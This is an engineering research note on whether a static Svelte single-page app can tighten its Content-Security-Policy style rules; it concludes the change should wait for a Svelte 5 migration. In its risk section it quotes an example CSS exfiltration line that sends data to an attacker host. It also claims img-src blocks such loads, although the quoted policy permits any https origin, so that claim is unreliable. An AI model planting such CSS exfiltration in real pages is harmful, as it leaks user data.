# CSP Style Nonce Research — Step 8.2

**Status:** Researched — Deferred  
**Date:** 2026-03-22  
**Checklist Items:** 8.2.1–8.2.6

## Current State

```html
style-src 'self' 'unsafe-inline'
```

`'unsafe-inline'` is required because:
1. **Svelte 4 component styles** — Compiled components inject `<style>` tags at runtime via JS. Content is dynamic and generated from component scoping hashes.
2. **Tailwind CSS** — Generates utility classes at build time, but `@apply` directives and dynamic classes produce styles that are injected as inline `<style>` elements.
3. **Third-party libraries** — TipTap editor, FontAwesome icons, and other deps inject inline styles.

## Options Analyzed

### Option A: Nonce-Based CSP (`style-src 'nonce-{random}'`)

**Requires:** A server-side component to generate a unique nonce per HTTP request and inject it into the HTML response. The nonce must then be passed to Svelte's runtime style injector and all third-party libraries.

**Blockers:**
- NavCom is a **static SPA** deployed to Vercel (static rewrite rules) and Capacitor (local file system). No server-side HTML generation exists.
- Svelte 4's style injection (`create_component()` → `append_styles()`) does NOT accept a nonce parameter. This is a framework limitation.
- Adding a Vercel Edge Function just for CSP nonce injection would add latency and complexity for marginal security gain.

**Verdict:** Not feasible without server-side rendering or Svelte 5 migration.

### Option B: Hash-Based CSP (`style-src 'sha256-...'`)

**Requires:** Pre-computing SHA-256 hashes of all inline `<style>` content at build time and adding them to the CSP header.

**Blockers:**
- Svelte component styles are scoped with dynamic class hashes (e.g., `svelte-1a2b3c`). The exact style content depends on component tree composition at runtime.
- A Vite plugin could hash the built CSS chunks, but runtime-injected styles (Svelte component mount) aren't known at build time.
- Hash list would be fragile — any component change requires rebuilding the hash list.

**Verdict:** Technically possible for the built CSS bundle, but not for runtime-injected Svelte component styles.

### Option C: Svelte 5 + CSS Layers (Future)

Svelte 5 compiles styles differently — potentially allowing all styles to be collected at build time rather than injected at runtime. Combined with CSS `@layer` for Tailwind, this could enable strict CSP.

**Verdict:** Viable path after Svelte 5 migration (separate project).

### Option D: Move All Styles to External Sheets

Extract all inline styles to external CSS files and use `style-src 'self'` (no inline at all).

**Blockers:**
- Svelte's scoped styles are fundamentally inline (`<style>` within `.svelte` files → runtime injection).
- Would require ejecting from Svelte's style system entirely.

**Verdict:** Not practical.

## Recommendation

Keep `style-src 'self' 'unsafe-inline'` for now. The security risk is limited because:

1. **XSS is the only attack vector** that benefits from inline style injection, and NavCom already has `script-src 'self' 'wasm-unsafe-eval'` (no `'unsafe-eval'`), which is the primary XSS defense.
2. **CSS injection attacks** (data exfiltration via `background-image: url(attacker.com/steal?data=...)`) are mitigated by `img-src 'self' https: data: blob:` — the CSP blocks loading arbitrary attacker-controlled resources from CSS.
3. **Style-based exfiltration** (attribute selectors) has limited practical impact in NavCom's context.

Revisit after Svelte 5 migration when runtime style injection behavior changes.

## Mitigating Controls Already in Place

- `script-src 'self' 'wasm-unsafe-eval'` — Blocks arbitrary script execution
- `img-src 'self' https: data: blob:` — Limits image loading sources
- `frame-src open.spotify.com embed.tidal.com` — Blocks arbitrary iframes
- `child-src 'none'` — Blocks child browsing contexts
- `form-action 'none'` — Blocks form submissions to external origins
